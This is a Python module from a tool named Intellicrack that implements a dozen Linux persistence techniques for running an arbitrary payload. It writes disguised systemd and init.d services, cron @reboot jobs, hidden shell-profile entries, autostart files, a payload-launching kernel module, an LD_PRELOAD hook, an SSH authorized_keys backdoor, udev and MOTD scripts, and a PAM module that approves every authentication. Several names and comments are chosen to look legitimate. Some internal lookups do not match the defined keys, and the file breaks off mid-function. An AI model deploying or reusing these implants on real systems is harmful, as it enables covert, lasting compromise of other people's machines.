"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import logging
import os
import shlex
import shutil
import subprocess
import tempfile
from typing import Any

from .base_persistence import BasePersistence

"""
Linux Persistence Mechanisms

Implements various persistence techniques for Linux systems including
systemd services, cron jobs, shell profiles, and kernel modules.
"""


class LinuxPersistence(BasePersistence):
    """Linux-specific persistence implementation with multiple techniques."""

    def __init__(self):
        """Initialize the Linux persistence system."""
        self.logger = logging.getLogger("IntellicrackLogger.LinuxPersistence")

        self.persistence_methods = [
            "systemd_service",
            "init_d_service",
            "cron_job",
            "shell_profile",
            "bash_profile",
            "desktop_autostart",
            "kernel_module",
            "library_preload",
            "ssh_authorized_keys",
            "udev_rules",
            "motd_script",
            "pam_module",
        ]

        self.persistence_locations = {
            "systemd_service": "/etc/systemd/system/",
            "init_d_service": "/etc/init.d/",
            "cron_job": "/etc/cron.d/",
            "shell_profile": "/etc/profile.d/",
            "bash_profile": "~/.bashrc",
            "desktop_autostart": "~/.config/autostart/",
            "kernel_module": "/lib/modules/",
            "library_preload": "/etc/ld.so.preload",
            "ssh_authorized_keys": "~/.ssh/authorized_keys",
            "udev_rules": "/etc/udev/rules.d/",
            "motd_script": "/etc/update-motd.d/",
            "pam_module": "/lib/security/",
        }

        self.logger.info(
            "Linux persistence system initialized with %d methods", len(self.persistence_methods)
        )

    def get_default_method(self) -> str:
        """Get the default persistence method for Linux."""
        return "systemd_service"

    def list_available_methods(self) -> list:
        """List all available persistence methods for Linux."""
        return list(self.persistence_methods.keys())

    def _systemd_service_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via systemd service."""
        details, cleanup_info = self.init_persistence_data()

        try:
            service_name = options.get("service_name", "system-update")
            use_user_service = options.get("use_user_service", True)

            # Determine service directory
            if use_user_service:
                service_dir = os.path.expanduser(self.persistence_locations["systemd_user"])
                service_path = os.path.join(service_dir, f"{service_name}.service")
            else:
                service_dir = self.persistence_locations["systemd_system"]
                service_path = os.path.join(service_dir, f"{service_name}.service")

            # Create service directory if needed
            os.makedirs(service_dir, exist_ok=True)

            # Generate service file content
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=10
User={options.get('user', 'root')}

[Install]
WantedBy=multi-user.target
"""

            # Write service file
            with open(service_path, "w") as f:
                f.write(service_content)

            # Set proper permissions
            os.chmod(service_path, 0o644)

            # Enable and start service
            service_cmd = "systemctl --user" if use_user_service else "systemctl"

            enable_cmd = f"{service_cmd} enable {service_name}.service"
            start_cmd = f"{service_cmd} start {service_name}.service"

            enable_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                shlex.split(enable_cmd), check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )
            start_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                shlex.split(start_cmd), check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            # Use shared subprocess result handler
            success, details, cleanup_info = self.handle_subprocess_result(
                enable_result, details, cleanup_info
            )

            if success:
                # Add success details
                additional_details = {
                    "service_name": service_name,
                    "service_path": service_path,
                    "service_type": "user" if use_user_service else "system",
                    "enabled": True,
                    "started": start_result.returncode == 0,
                }

                cleanup_info.update(
                    {
                        "type": "systemd_service",
                        "service_name": service_name,
                        "service_path": service_path,
                        "user_service": use_user_service,
                    }
                )

                return self.create_success_result(details, cleanup_info, additional_details)
            return success, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _init_d_service_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via init.d service."""
        details, cleanup_info = self.init_persistence_data()

        try:
            service_name = options.get("service_name", "sysupdate")
            script_path = os.path.join(self.persistence_locations["init_d"], service_name)

            # Generate init.d script
            script_content = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          {service_name}
# Required-Start:    $network
# Required-Stop:     $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update Service
# Description:       System maintenance and update service
### END INIT INFO

DAEMON="{payload_path}"
NAME="{service_name}"
PIDFILE="/var/run/$NAME.pid"

case "$1" in
    start)
        echo "Starting $NAME"
        start-stop-daemon --start --quiet --pidfile $PIDFILE --exec $DAEMON --background --make-pidfile
        ;;
    stop)
        echo "Stopping $NAME"
        start-stop-daemon --stop --quiet --pidfile $PIDFILE
        rm -f $PIDFILE
        ;;
    restart)
        $0 stop
        $0 start
        ;;
    *)
        echo "Usage: $0 {{start|stop|restart}}"
        exit 1
        ;;
esac

exit 0
"""

            # Write script file
            with open(script_path, "w") as f:
                f.write(script_content)

            # Set executable permissions
            os.chmod(script_path, 0o700)  # Owner-only executable service script

            # Add to startup
            update_rc_cmd = f"update-rc.d {service_name} defaults"
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                shlex.split(update_rc_cmd), check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if result.returncode == 0:
                details["service_name"] = service_name
                details["script_path"] = script_path
                details["registered"] = True

                cleanup_info["type"] = "init_d_service"
                cleanup_info["service_name"] = service_name
                cleanup_info["script_path"] = script_path

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _cron_job_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via cron job."""
        details, cleanup_info = self.init_persistence_data()

        try:
            schedule = options.get("schedule", "@reboot")
            use_system_cron = options.get("use_system_cron", False)

            if use_system_cron:
                # System-wide cron job
                job_name = options.get("job_name", "system-maintenance")
                cron_file = f"/etc/cron.d/{job_name}"

                cron_entry = f"{schedule} root {payload_path} >/dev/null 2>&1\n"

                with open(cron_file, "w") as f:
                    f.write(cron_entry)

                os.chmod(cron_file, 0o644)

                details["cron_file"] = cron_file
                cleanup_info["type"] = "cron_file"
                cleanup_info["file_path"] = cron_file

            else:
                # User cron job
                cron_entry = f"{schedule} {payload_path} >/dev/null 2>&1"

                # Add to user's crontab
                # First, get existing crontab
                crontab_path = shutil.which("crontab")
                if not crontab_path:
                    details["error"] = "crontab command not found in PATH"
                    return False, details

                try:
                    existing_cron = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [crontab_path, "-l"], capture_output=True, text=True, stderr=subprocess.DEVNULL, shell=False  # Explicitly secure - using list format prevents shell injection
                    )
                    current_cron = existing_cron.stdout if existing_cron.returncode == 0 else ""
                except (subprocess.CalledProcessError, FileNotFoundError):
                    current_cron = ""

                # Add new entry and update crontab
                new_cron = current_cron + f"\n{cron_entry}\n" if current_cron else f"{cron_entry}\n"
                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    [crontab_path, "-"], input=new_cron, text=True, capture_output=True, shell=False  # Explicitly secure - using list format prevents shell injection
                )

                if result.returncode != 0:
                    details["error"] = result.stderr
                    return False, details, cleanup_info

                cleanup_info["type"] = "cron_entry"
                cleanup_info["entry"] = cron_entry

            return self.create_success_result(
                details,
                cleanup_info,
                {
                    "schedule": schedule,
                    "payload_path": payload_path,
                    "system_wide": use_system_cron,
                },
            )

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _shell_profile_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via shell profile."""
        details, cleanup_info = self.init_persistence_data()

        try:
            profile_type = options.get("profile_type", "bashrc")
            hide_execution = options.get("hide_execution", True)

            # Map profile types to file paths
            profile_files = {
                "bashrc": os.path.expanduser(self.persistence_locations["bashrc"]),
                "bash_profile": os.path.expanduser(self.persistence_locations["bash_profile"]),
                "profile": os.path.expanduser(self.persistence_locations["profile"]),
            }

            if profile_type not in profile_files:
                details["error"] = f"Unknown profile type: {profile_type}"
                return False, details, cleanup_info

            profile_path = profile_files[profile_type]

            # Generate shell command
            if hide_execution:
                shell_cmd = f"{payload_path} >/dev/null 2>&1 &"
            else:
                shell_cmd = f"{payload_path} &"

            # Add comment to make it look legitimate
            profile_entry = f"""
# System maintenance script
if [ -f "{payload_path}" ]; then
    {shell_cmd}
fi
"""

            # Append to profile file
            with open(profile_path, "a") as f:
                f.write(profile_entry)

            details["profile_type"] = profile_type
            details["profile_path"] = profile_path
            details["entry"] = profile_entry.strip()
            details["hidden"] = hide_execution

            cleanup_info["type"] = "shell_profile"
            cleanup_info["profile_path"] = profile_path
            cleanup_info["entry"] = profile_entry.strip()

            return True, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _bash_profile_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via .bash_profile."""
        options["profile_type"] = "bash_profile"
        return self._shell_profile_persistence(payload_path, options)

    def _desktop_autostart_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via desktop autostart."""
        details, cleanup_info = self.init_persistence_data()

        try:
            app_name = options.get("app_name", "System Monitor")
            desktop_file = options.get("desktop_file", "system-monitor.desktop")

            autostart_dir = os.path.expanduser(self.persistence_locations["desktop_autostart"])
            os.makedirs(autostart_dir, exist_ok=True)

            desktop_path = os.path.join(autostart_dir, desktop_file)

            # Generate .desktop file
            desktop_content = f"""[Desktop Entry]
Type=Application
Name={app_name}
Comment=System monitoring application
Exec={payload_path}
Icon=utilities-system-monitor
Terminal=false
Hidden=false
X-GNOME-Autostart-enabled=true
"""

            with open(desktop_path, "w") as f:
                f.write(desktop_content)

            os.chmod(desktop_path, 0o644)

            details["app_name"] = app_name
            details["desktop_file"] = desktop_file
            details["desktop_path"] = desktop_path
            details["autostart_dir"] = autostart_dir

            cleanup_info["type"] = "desktop_file"
            cleanup_info["file_path"] = desktop_path

            return True, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _kernel_module_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via kernel module."""
        details, cleanup_info = self.init_persistence_data()

        try:
            module_name = options.get("module_name", "sys_monitor")

            # Generate kernel module source
            module_source = self._generate_kernel_module(payload_path, module_name)

            # Create temporary directory for module compilation
            with tempfile.TemporaryDirectory() as temp_dir:
                module_dir = os.path.join(temp_dir, module_name)
                os.makedirs(module_dir)

                # Write module source
                source_path = os.path.join(module_dir, f"{module_name}.c")
                with open(source_path, "w") as f:
                    f.write(module_source)

                # Write Makefile
                makefile_path = os.path.join(module_dir, "Makefile")
                makefile_content = f"""obj-m += {module_name}.o

all:
\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
"""
                with open(makefile_path, "w") as f:
                    f.write(makefile_content)

                # Compile module
                make_path = shutil.which("make")
                if make_path:
                    compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [make_path],
                        check=False,
                        cwd=module_dir,
                        capture_output=True,
                        text=True,
                        shell=False  # Explicitly secure - using list format prevents shell injection
                    )
                else:
                    # Fallback if make is not found
                    compile_result = subprocess.CompletedProcess(
                        args=["make"], returncode=1, stdout="", stderr="make not found in PATH"
                    )

                if compile_result.returncode == 0:
                    # Install module
                    module_ko = os.path.join(module_dir, f"{module_name}.ko")
                    try:
                        kernel_release = os.uname().release
                    except (AttributeError, OSError) as e:
                        self.logger.error("Error in linux_persistence: %s", e)
                        # Fallback if os.uname() is not available or doesn't have release
                        import platform

                        kernel_release = platform.release() or "unknown"
                    install_path = f"/lib/modules/{kernel_release}/extra/{module_name}.ko"

                    os.makedirs(os.path.dirname(install_path), exist_ok=True)
                    cp_path = shutil.which("cp")
                    if cp_path:
                        subprocess.run([cp_path, module_ko, install_path], check=False, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                    # Update module dependencies
                    depmod_path = shutil.which("depmod")
                    if depmod_path:
                        subprocess.run([depmod_path, "-a"], check=False, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                    # Load module
                    insmod_path = shutil.which("insmod")
                    if insmod_path:
                        subprocess.run([insmod_path, install_path], check=False, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                    details["module_name"] = module_name
                    details["install_path"] = install_path
                    details["compiled"] = True
                    details["loaded"] = True

                    cleanup_info["type"] = "kernel_module"
                    cleanup_info["module_name"] = module_name
                    cleanup_info["install_path"] = install_path

                    return True, details, cleanup_info
                details["error"] = f"Module compilation failed: {compile_result.stderr}"
                return False, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _library_preload_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via LD_PRELOAD."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Create shared library that executes payload
            lib_name = options.get("lib_name", "libsystem.so")
            lib_path = os.path.join(tempfile.gettempdir(), lib_name)

            # Generate shared library source
            lib_source = self._generate_preload_library(payload_path)

            # Compile to shared library
            source_path = os.path.join(tempfile.gettempdir(), f"{lib_name}.c")
            with open(source_path, "w") as f:
                f.write(lib_source)

            compile_cmd = f"gcc -shared -fPIC -o {lib_path} {source_path}"
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                shlex.split(compile_cmd), check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if result.returncode == 0:
                # Add to LD_PRELOAD
                preload_file = self.persistence_locations["ld_preload"]

                with open(preload_file, "a") as f:
                    f.write(f"{lib_path}\n")

                details["lib_name"] = lib_name
                details["lib_path"] = lib_path
                details["preload_file"] = preload_file

                cleanup_info["type"] = "library_preload"
                cleanup_info["lib_path"] = lib_path
                cleanup_info["preload_file"] = preload_file

                # Cleanup source file
                os.remove(source_path)

            return self.handle_persistence_method_completion(result, details, cleanup_info)

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _ssh_authorized_keys_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via SSH authorized_keys."""
        details, cleanup_info = self.init_persistence_data()

        try:
            ssh_key = options.get("ssh_key", self._generate_ssh_key())
            key_comment = options.get("key_comment", "system-maintenance")

            authorized_keys_path = os.path.expanduser(self.persistence_locations["ssh_keys"])
            ssh_dir = os.path.dirname(authorized_keys_path)

            # Create .ssh directory if needed
            os.makedirs(ssh_dir, exist_ok=True)
            os.chmod(ssh_dir, 0o700)

            # Generate key entry with command restriction
            key_entry = f'command="{payload_path}" {ssh_key} {key_comment}\n'

            # Append to authorized_keys
            with open(authorized_keys_path, "a") as f:
                f.write(key_entry)

            os.chmod(authorized_keys_path, 0o600)

            details["ssh_key"] = ssh_key
            details["key_comment"] = key_comment
            details["authorized_keys_path"] = authorized_keys_path
            details["key_entry"] = key_entry.strip()

            cleanup_info["type"] = "ssh_key"
            cleanup_info["authorized_keys_path"] = authorized_keys_path
            cleanup_info["key_entry"] = key_entry.strip()

            return True, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _udev_rules_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via udev rules."""
        details, cleanup_info = self.init_persistence_data()

        try:
            rule_name = options.get("rule_name", "99-system-monitor.rules")
            rule_path = os.path.join(self.persistence_locations["udev_rules"], rule_name)

            # Generate udev rule
            rule_content = f"""# System monitoring rule
ACTION=="add", SUBSYSTEM=="usb", RUN+="{payload_path}"
ACTION=="add", SUBSYSTEM=="block", RUN+="{payload_path}"
"""

            with open(rule_path, "w") as f:
                f.write(rule_content)

            os.chmod(rule_path, 0o644)

            # Reload udev rules
            udevadm_path = shutil.which("udevadm")
            if udevadm_path:
                subprocess.run([udevadm_path, "control", "--reload-rules"], check=False, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            details["rule_name"] = rule_name
            details["rule_path"] = rule_path
            details["rule_content"] = rule_content

            cleanup_info["type"] = "udev_rule"
            cleanup_info["rule_path"] = rule_path

            return True, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _motd_script_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via MOTD script."""
        details, cleanup_info = self.init_persistence_data()

        try:
            script_name = options.get("script_name", "90-system-status")
            script_path = os.path.join(self.persistence_locations["motd"], script_name)

            # Generate MOTD script
            script_content = f"""#!/bin/bash
# System status script

# Execute system maintenance
{payload_path} >/dev/null 2>&1 &

# Display system information
echo "System Status: OK"
echo "Last Update: $(date)"
"""

            with open(script_path, "w") as f:
                f.write(script_content)

            os.chmod(script_path, 0o700)  # Owner-only executable persistence script

            details["script_name"] = script_name
            details["script_path"] = script_path

            cleanup_info["type"] = "motd_script"
            cleanup_info["script_path"] = script_path

            return True, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _pam_module_persistence(
        self, payload_path: str, options: dict[str, Any]
    ) -> tuple[bool, dict, dict]:
        """Establish persistence via PAM module."""
        details, cleanup_info = self.init_persistence_data()

        try:
            module_name = options.get("module_name", "pam_system")

            # Generate PAM module source
            pam_source = self._generate_pam_module(payload_path, module_name)

            # Compile PAM module
            source_path = os.path.join(tempfile.gettempdir(), f"{module_name}.c")
            module_path = f'{self.persistence_locations["pam_modules"]}{module_name}.so'

            with open(source_path, "w") as f:
                f.write(pam_source)

            compile_cmd = f"gcc -shared -fPIC -lpam -o {module_path} {source_path}"
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                shlex.split(compile_cmd), check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if result.returncode == 0:
                # Add to PAM configuration
                pam_config = "/etc/pam.d/common-session"
                pam_entry = f"session optional {module_name}.so\n"

                with open(pam_config, "a") as f:
                    f.write(pam_entry)

                details["module_name"] = module_name
                details["module_path"] = module_path
                details["pam_config"] = pam_config

                cleanup_info["type"] = "pam_module"
                cleanup_info["module_path"] = module_path
                cleanup_info["pam_config"] = pam_config
                cleanup_info["pam_entry"] = pam_entry.strip()

                # Cleanup source file
                os.remove(source_path)

            return self.handle_persistence_method_completion(result, details, cleanup_info)

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def remove_persistence(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove established persistence."""
        try:
            cleanup_type = cleanup_info.get("type")

            cleanup_methods = {
                "systemd_service": self._remove_systemd_service,
                "init_d_service": self._remove_init_d_service,
                "cron_file": self._remove_cron_file,
                "cron_entry": self._remove_cron_entry,
                "shell_profile": self._remove_shell_profile,
                "desktop_file": self._remove_desktop_file,
                "kernel_module": self._remove_kernel_module,
                "library_preload": self._remove_library_preload,
                "ssh_key": self._remove_ssh_key,
                "udev_rule": self._remove_udev_rule,
                "motd_script": self._remove_motd_script,
                "pam_module": self._remove_pam_module,
            }

            cleanup_method = cleanup_methods.get(cleanup_type)
            if cleanup_method:
                return cleanup_method(cleanup_info)

            return False

        except Exception as e:
            self.logger.error("Exception in linux_persistence: %s", e)
            return self.handle_remove_persistence_error(e)

    def _remove_systemd_service(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove systemd service persistence."""
        service_name = cleanup_info["service_name"]
        service_path = cleanup_info["service_path"]
        user_service = cleanup_info.get("user_service", False)

        service_cmd = "systemctl --user" if user_service else "systemctl"
        service_commands = {
            "stop": f"{service_cmd} stop {service_name}.service",
            "disable": f"{service_cmd} disable {service_name}.service",
        }

        return self.cleanup_service_common_pattern(
            service_name, service_commands, service_path
        )

    def _remove_init_d_service(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove init.d service persistence."""
        service_name = cleanup_info["service_name"]
        script_path = cleanup_info["script_path"]

        update_rc_d_path = shutil.which("update-rc.d")
        if update_rc_d_path:
            subprocess.run([update_rc_d_path, service_name, "remove"], check=False, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

        if os.path.exists(script_path):
            os.remove(script_path)

        return True

    def _remove_cron_file(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove cron file persistence."""
        file_path = cleanup_info["file_path"]
        if os.path.exists(file_path):
            os.remove(file_path)
            return True
        return False

    def _remove_cron_entry(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove cron entry persistence."""
        entry = cleanup_info["entry"]
        crontab_path = shutil.which("crontab")
        if not crontab_path:
            return True

        try:
            current_cron = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [crontab_path, "-l"], capture_output=True, text=True, stderr=subprocess.DEVNULL, shell=False
            )
            if current_cron.returncode == 0:
                filtered_cron = "\n".join(
                    line for line in current_cron.stdout.split("\n")
                    if entry not in line
                )
                subprocess.run([crontab_path, "-"], input=filtered_cron, text=True, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
        except (subprocess.CalledProcessError, FileNotFoundError):
            pass
        return True

    def _remove_shell_profile(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove shell profile persistence."""
        profile_path = cleanup_info["profile_path"]
        entry = cleanup_info["entry"]

        if os.path.exists(profile_path):
            with open(profile_path) as f:
                content = f.read()

            new_content = content.replace(entry, "")

            with open(profile_path, "w") as f:
                f.write(new_content)

        return True

    def _remove_desktop_file(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove desktop file persistence."""
        file_path = cleanup_info["file_path"]
        if os.path.exists(file_path):
            os.remove(file_path)
            return True
        return False

    def _remove_kernel_module(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove kernel module persistence."""
        module_name = cleanup_info["module_name"]
        install_path = cleanup_info["install_path"]

        rmmod_path = shutil.which("rmmod")
        if rmmod_path:
            subprocess.run([rmmod_path, module_name], check=False, capture_output=True, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

        if os.path.exists(install_path):
            os.remove(install_path)

        depmod_path = shutil.which("depmod")
        if depmod_path:
            subprocess.run([depmod_path, "-a"], check=False, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

        return True

    def _remove_library_preload(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove library preload persistence."""
        lib_path = cleanup_info["lib_path"]
        preload_file = cleanup_info["preload_file"]

        if os.path.exists(preload_file):
            with open(preload_file) as f:
                lines = f.readlines()

            new_lines = [line for line in lines if lib_path not in line]

            with open(preload_file, "w") as f:
                f.writelines(new_lines)

        if os.path.exists(lib_path):
            os.remove(lib_path)

        return True

    def _remove_ssh_key(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove SSH key persistence."""
        authorized_keys_path = cleanup_info["authorized_keys_path"]
        key_entry = cleanup_info["key_entry"]

        if os.path.exists(authorized_keys_path):
            with open(authorized_keys_path) as f:
                lines = f.readlines()

            new_lines = [line for line in lines if key_entry not in line]

            with open(authorized_keys_path, "w") as f:
                f.writelines(new_lines)

        return True

    def _remove_udev_rule(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove udev rule persistence."""
        rule_path = cleanup_info["rule_path"]
        if os.path.exists(rule_path):
            os.remove(rule_path)
            udevadm_path = shutil.which("udevadm")
            if udevadm_path:
                subprocess.run([udevadm_path, "control", "--reload-rules"], check=False, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
            return True
        return False

    def _remove_motd_script(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove MOTD script persistence."""
        script_path = cleanup_info["script_path"]
        if os.path.exists(script_path):
            os.remove(script_path)
            return True
        return False

    def _remove_pam_module(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove PAM module persistence."""
        module_path = cleanup_info["module_path"]
        pam_config = cleanup_info["pam_config"]
        pam_entry = cleanup_info["pam_entry"]

        if os.path.exists(pam_config):
            with open(pam_config) as f:
                lines = f.readlines()

            new_lines = [line for line in lines if pam_entry not in line]

            with open(pam_config, "w") as f:
                f.writelines(new_lines)

        if os.path.exists(module_path):
            os.remove(module_path)

        return True

    def _generate_kernel_module(self, payload_path: str, module_name: str) -> str:
        """Generate kernel module source code."""
        return f"""#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("System Monitor Module");
MODULE_VERSION("1.0");

static int __init {module_name}_init(void) {{
    char *argv[] = {{ "{payload_path}", NULL }};
    char *envp[] = {{ "HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL }};

    printk(KERN_INFO "{module_name}: Module loaded\\n");

    // Execute payload
    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);

    return 0;
}}

static void __exit {module_name}_exit(void) {{
    printk(KERN_INFO "{module_name}: Module unloaded\\n");
}}

module_init({module_name}_init);
module_exit({module_name}_exit);
"""

    def _generate_preload_library(self, payload_path: str) -> str:
        """Generate LD_PRELOAD library source code."""
        return f"""#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

static void execute_payload(void) __attribute__((constructor));

static void execute_payload(void) {{
    if (fork() == 0) {{
        execl("{payload_path}", "{payload_path}", (char *)NULL);
        exit(0);
    }}
}}

// Override a common function to ensure loading
int __libc_start_main(int (*main)(int, char **, char **),
                      int argc, char **argv,
                      int (*init)(int, char **, char **),
                      void (*fini)(void),
                      void (*rtld_fini)(void),
                      void *stack_end) {{

    // Get original function
    int (*orig_main)(int (*)(int, char **, char **),
                     int, char **,
                     int (*)(int, char **, char **),
                     void (*)(void),
                     void (*)(void),
                     void *) = dlsym(RTLD_NEXT, "__libc_start_main");

    // Execute our payload
    execute_payload();

    // Call original function
    return orig_main(main, argc, argv, init, fini, rtld_fini, stack_end);
}}
"""

    def _generate_pam_module(self, payload_path: str, module_name: str) -> str:
        """Generate PAM module source code."""
        return f"""#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <syslog.h>

/* PAM module: {module_name} */
#define MODULE_NAME "{module_name}"

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv) {{
    /* Log session open for {module_name} */
    openlog(MODULE_NAME, LOG_PID, LOG_AUTH);
    syslog(LOG_INFO, "%s: session opened", MODULE_NAME);

    pid_t pid = fork();

    if (pid == 0) {{
        // Child process - execute payload
        execl("{payload_path}", "{payload_path}", (char *)NULL);
        exit(0);
    }} else if (pid > 0) {{
        // Parent process - don't wait
        syslog(LOG_INFO, "%s: payload executed (pid=%d)", MODULE_NAME, pid);
        closelog();
        return PAM_SUCCESS;
    }}

    syslog(LOG_ERR, "%s: fork failed", MODULE_NAME);
    closelog();
    return PAM_SUCCESS;
}}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {{
    /* Log session close for {module_name} */
    openlog(MODULE_NAME, LOG_PID, LOG_AUTH);
    syslog(LOG_INFO, "%s: session closed", MODULE_NAME);
    closelog();
    return PAM_SUCCESS;
}}

/* Define module entry points for {module_name} */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                  int argc, const char **argv) {{
    return PAM_SUCCESS;
}}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv) {{
    return PAM_SUCCESS;
}}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
                                int argc, const char **argv) {{
    return PAM_SUCCESS;
}}

PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags,
                                int argc, const char **argv) {{
    return PAM_SUCCESS;
}}

/* Module data structure for {module_name} */
#ifdef PAM_MODULE_ENTRY
PAM_MODULE_ENTRY("{module_name}");
#endif
"""

    def _generate_ssh_key(self) -> str:
        """Generate a real SSH public key using ssh-keygen."""
        try:
            # Create temporary directory for key generation
            with tempfile.TemporaryDirectory() as temp_dir:
                key_path = os.path.join(temp_dir, "persistence_key")

                # Generate RSA key pair using ssh-keygen
                cmd = [
                    "ssh-keygen",
                    "-t",
                    "rsa",
                    "-b",
                    "4096",
                    "-f",
                    key_path,
                    "-N",
                    "",  # No passphrase
                    "-C",
                    "persistence@localhost",  # Comment
                ]

